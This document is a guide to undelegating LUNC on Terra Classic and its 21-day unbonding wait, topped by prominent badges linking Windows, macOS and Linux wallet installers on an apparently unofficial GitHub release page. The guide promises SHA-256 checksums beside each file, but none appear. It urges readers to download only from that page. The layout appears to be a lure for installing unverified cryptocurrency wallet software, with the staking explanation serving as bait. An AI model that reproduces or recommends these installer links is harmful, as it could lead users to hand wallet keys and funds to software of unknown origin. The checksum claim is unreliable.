![Terra Station Wallet](assets/banner-article.png)

# Unstaking LUNC and the 21-Day Unbonding

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Undelegating is instant in the app and the payout is not: Terra Classic holds undelegated LUNC for 21 days before it becomes spendable. The coins never leave your address during that time, they simply stop earning, and nothing can shorten the wait - which is why staking is worth understanding before you commit a balance you may need soon.

## What actually happens when you undelegate

You sign a transaction that removes your delegation from a validator. From that block, the stake no longer counts toward that validator's voting power and no longer earns rewards. The amount enters an unbonding queue, and it becomes spendable when the 21-day period ends.

Three things stay true throughout: the LUNC is still yours, it is still at your address, and nobody - validator, project or support - can move it or release it early.

## What you see during the wait

| Before | After undelegating | After 21 days |
|---|---|---|
| In the delegation list, earning rewards | Removed from the delegation list, still not in the available balance | Lands in the available balance, spendable |
| Rewards accrue | Nothing accrues | Normal balance activity resumes |

The gap in the middle is where the confusion lives. The delegation is gone from the list, the available balance has not gone up, and the wallet looks lighter than it should. That is the queue working as designed, not a failed transaction, and nothing has been sent anywhere or charged for the wait.

If the amount still has not become spendable after the period, check the transaction in an explorer before undelegating again - a second undelegation of stake that is already unbonding does nothing useful. https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-explorer.md shows how to read the state.

## Why the wait exists

A 21-day unbonding period is a chain rule, and the reasoning behind such a wait is that stake should not be usable and instantly withdrawable at the same time. Every wallet on Terra Classic inherits it; it is not a policy this app chose and not something a support request can waive.

It also means the minimum horizon for any staked LUNC is three weeks. If you may need the balance before then, leave it liquid or stake less.

## Undelegating step by step

1. Check the wallet is on Terra Classic and confirm the delegation you want to remove.
2. Keep a little liquid LUNC - undelegating costs a network fee, and a fully delegated wallet has none. *Staked Everything and Cannot Pay Fees to Claim* covers that trap in full.
3. Choose to undelegate and enter the amount. Partial undelegation is fine; you do not have to remove the whole delegation.
4. Approve the transaction and wait for confirmation, then confirm the delegation amount has dropped by what you removed.
5. Note the date. The 21 days start from the block that confirmed the undelegation, not from when you began.

If the transaction fails with an insufficient-fee error, nothing has changed and no timer has started - free some LUNC first, then retry.

## Can you lose staked LUNC?

Not through staking, and not through unbonding. The balance remains at your address and the wallet still owns it; what changes is when you can move it. Reports of "lost" staked LUNC almost always describe one of three states: the balance is in the delegation list rather than the available balance, the wallet is on another chain, or the phrase being used derives a different account.

https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/zero-balance-after-terra-station-import.md separates those cases. The one genuine trap is the fee reserve, which is a liquidity problem rather than a loss (*Staked Everything and Cannot Pay Fees to Claim*).

## Planning around the wait

A 21-day queue is easier to live with once you treat it as a date rather than an obstacle. Three cases where it changes the answer:

- **You may need the balance within a month.** Keep that portion liquid instead of staking it. Staking money you will need soon is how people end up borrowing against a wait they cannot shorten.
- **You are rotating between validators.** Decide the destination before you undelegate, so the 21 days end with a delegation rather than with a decision still to make.
- **You only need to free fees.** Undelegate the smallest amount that solves the problem. The same clock applies to one LUNC as to the whole delegation, so there is no advantage in moving everything.

Write the date down when the undelegation confirms. The queue is the only part of staking that is genuinely irreversible, and it is much easier to tolerate when you can see when it ends.

## Changing validator, and the alternative

Wanting a different validator is the most common reason to undelegate, and it is expensive in time: undelegate, wait 21 days, then delegate again. Some staking screens offer to redelegate, which moves an existing delegation to another validator without waiting for the queue - check the delegation's own menu before assuming you must unbond.

Either way, the decision about which validator to move to is worth making before the timer starts, not after. *How to Choose a LUNC Validator* covers what to compare, and https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-staking.md covers the delegate step you will repeat.

## Questions people ask

### Where did my coins go during unbonding?

Nowhere. They sit at your address in an unbonding state, outside the delegation list and outside the available balance. The explorer shows the balance unchanged; only the spendable amount is affected.

### Can I cancel an unbonding period?

No. Once the undelegation confirms, the wait runs. Delegating the same amount again starts a fresh delegation rather than cancelling the queue.

### Do undelegated coins earn rewards during the wait?

No. Accrual stops at the block that removes the delegation and resumes only if you delegate again.

### Why 21 days and not a few hours?

It is the chain's unbonding period, chosen so that staking decisions cannot be reversed faster than the network can react to them. No wallet or validator can change it for you.
